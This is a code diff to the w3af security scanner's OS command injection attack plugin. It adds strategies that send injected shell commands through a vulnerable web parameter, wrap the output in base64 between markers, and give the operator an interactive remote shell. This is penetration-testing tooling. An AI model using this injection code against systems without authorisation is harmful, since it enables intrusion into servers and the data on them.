@@ -20,15 +20,118 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
 import core.controllers.output_manager as om
+import plugins.attack.payloads.shell_handler as shell_handler
 
 from core.data.kb.exec_shell import ExecShell
 from core.data.fuzzer.utils import rand_alpha
 
 from core.controllers.plugins.attack_plugin import AttackPlugin
 from core.controllers.exceptions import w3afException
+from core.controllers.misc.common_attack_methods import CommonAttackMethods
 
 from plugins.attack.payloads.decorators.exec_decorator import exec_debug
 
+
+
+class ExploitStrategy(object):
+    '''
+    Base class for the different types of exploit strategies that this plugin
+    can use to execute commands and get the results.
+    '''
+    def __init__(self, vuln, uri_opener):
+        self._cmd_separator = vuln['separator']
+        self._remote_os = vuln['os']
+        self.vuln = vuln
+        self.uri_opener = uri_opener
+    
+    def send(self, cmd):
+        # Lets define the result header and footer.
+        func_ref = getattr(self.uri_opener, self.vuln.get_method())
+        
+        exploit_dc = self.vuln.get_dc().copy()
+        exploit_dc[self.vuln.get_var()] = cmd
+        
+        response = func_ref(self.vuln.get_url(), str(exploit_dc))
+        return response
+                
+    def can_exploit(self):
+        raise NotImplementedError
+    
+    def generate_command(self, command):
+        raise NotImplementedError
+    
+    def extract_result(self, http_response):
+        raise NotImplementedError
+
+class BasicExploitStrategy(ExploitStrategy, CommonAttackMethods):
+    def __init__(self, vuln, uri_opener):
+        ExploitStrategy.__init__(self, vuln, uri_opener)
+        CommonAttackMethods.__init__(self)
+        
+    def can_exploit(self):
+        # Define a test command:
+        rand = rand_alpha(8)
+        expected_output = rand + '\n'
+        
+        if self._remote_os == 'windows':
+            command = self.generate_command('echo %s' % rand)
+        else:
+            command = self.generate_command('/bin/echo %s' % rand)
+
+        # Lets define the result header and footer.
+        http_response = self.send(command)
+        return self._define_exact_cut(http_response.get_body(), expected_output)
+        
+    def generate_command(self, command):
+        if self._remote_os == 'windows':
+            command = '%s %s' % (self._cmd_separator, command)
+        else:
+            command = '%s %s' % (self._cmd_separator, command)
+            
+        return command
+    
+    def extract_result(self, http_response):
+        return self._cut(http_response.get_body())
+
+class FullPathExploitStrategy(ExploitStrategy):
+    '''
+    This strategy allows us to retrieve binary output from the commands we run
+    without any errors. Also, it returns exactly the bytes returned by the
+    command without any trailing or leading \n or any guessing on the command
+    result length.
+    '''
+    REMOTE_CMD = "%s /bin/echo -n '%s'; %s | /usr/bin/base64 | "\
+                 "/usr/bin/tr -d '\n'; /bin/echo -n '%s'"
+    
+    def can_exploit(self):
+        rand = rand_alpha(8)
+        cmd = self.generate_command('echo %s|rev' % rand)
+        
+        # For some reason that I don't care about, rev adds a \n to the string
+        # it reverses, even when I run the echo with "-n".
+        expected_output = '%s\n' % rand[::-1]
+        
+        http_response = self.send(cmd)
+        return expected_output == self.extract_result(http_response)
+        
+    def generate_command(self, command):
+        return self.REMOTE_CMD % (self._cmd_separator,
+                                  shell_handler.SHELL_IDENTIFIER_1,
+                                  command, shell_handler.SHELL_IDENTIFIER_2)
+    
+    def extract_result(self, http_response):
+        return shell_handler.extract_result(http_response.get_body())
+
+class CmdsInPathExploitStrategy(FullPathExploitStrategy):
+    '''
+    This strategy allows us to retrieve binary output from the commands we run
+    without any errors. Also, it returns exactly the bytes returned by the
+    command without any trailing or leading \n or any guessing on the command
+    result length.
+    '''
+    REMOTE_CMD = "%s echo -n '%s'; %s | base64 | "\
+                 "tr -d '\n'; echo -n '%s'"
+                 
 
 class os_commanding(AttackPlugin):
     '''
@@ -36,7 +139,9 @@ class os_commanding(AttackPlugin):
 
     @author: Andres Riancho (andres.riancho@gmail.com)
     '''
-
+    EXPLOIT_STRATEGIES = [FullPathExploitStrategy, CmdsInPathExploitStrategy,
+                          BasicExploitStrategy]
+    
     def __init__(self):
         AttackPlugin.__init__(self)
 
@@ -69,12 +174,10 @@ class os_commanding(AttackPlugin):
                  parameter.
         '''
         # Check if we really can execute commands on the remote server
-        if self._verify_vuln(vuln):
+        strategy = self._verify_vuln(vuln)
+        if strategy:
             # Create the shell object
-            shell_obj = OSCommandingShell(vuln, self._uri_opener,
-                                          self.worker_pool,
-                                          self._header_length,
-                                          self._footer_length)
+            shell_obj = OSCommandingShell(strategy, self.worker_pool)
             return shell_obj
 
         else:
@@ -86,31 +189,22 @@ class os_commanding(AttackPlugin):
 
         @return : True if vuln can be exploited.
         '''
-        # The vuln was saved to the kb as:
-        # kb.kb.append( self, 'os_commanding', v )
-        exploit_dc = vuln.get_dc()
-
-        # Define a test command:
-        rand = rand_alpha(8)
-        if vuln['os'] == 'windows':
-            command = vuln['separator'] + 'echo ' + rand
-            # TODO: Confirm that this works in windows
-            rand = rand + '\n\n'
-        else:
-            command = vuln['separator'] + '/bin/echo ' + rand
-            rand = rand + '\n'
-
-        # Lets define the result header and footer.
-        func_ref = getattr(self._uri_opener, vuln.get_method())
-        exploit_dc[vuln.get_var()] = command
-        try:
-            response = func_ref(vuln.get_url(), str(exploit_dc))
-        except w3afException, e:
-            om.out.error(str(e))
-            return False
-        else:
-            return self._define_exact_cut(response.get_body(), rand)
-
+        for StrategyKlass in self.EXPLOIT_STRATEGIES:
+            
+            strategy = StrategyKlass(vuln, self._uri_opener)
+            
+            msg = 'Trying to exploit vuln %s using %s.'
+            om.out.debug(msg % (vuln.get_id(), strategy))
+            
+            if strategy.can_exploit():
+                om.out.debug('Success with strategy %s.' % strategy)
+                return strategy
+        
+        om.out.debug('All strategies failed!')
+        
+        # No strategy can exploit this vulnerability
+        return False
+    
     def get_root_probability(self):
         '''
         @return: This method returns the probability of getting a root shell
@@ -133,10 +227,12 @@ class os_commanding(AttackPlugin):
 
 class OSCommandingShell(ExecShell):
 
-    def __init__(self, vuln, url_opener, worker_pool, header_len, footer_len):
-        super(OSCommandingShell, self).__init__(vuln, url_opener, worker_pool)
+    def __init__(self, strategy, worker_pool):
+        super(OSCommandingShell, self).__init__(strategy.vuln,
+                                                strategy.uri_opener,
+                                                worker_pool)
 
-        self.set_cut(header_len, footer_len)
+        self.strategy = strategy
 
     @exec_debug
     def execute(self, command):
@@ -147,17 +243,16 @@ class OSCommandingShell(ExecShell):
         @param command: The command to handle ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
-        func_ref = getattr(self._uri_opener, self.get_method())
-        exploit_dc = self.get_dc()
-        exploit_dc[self.get_var()] = self['separator'] + command
+        strategy_cmd = self.strategy.generate_command(command)
         try:
-            response = func_ref(self.get_url(), str(exploit_dc))
+            http_response = self.strategy.send(strategy_cmd)
         except w3afException, e:
             msg = 'Error "%s" while sending command to remote host. Please '\
                   'try again.'
             return msg % e
         else:
-            return self._cut(response.get_body())
+            return self.strategy.extract_result(http_response)
 
     def get_name(self):
         return 'os_commanding'
+
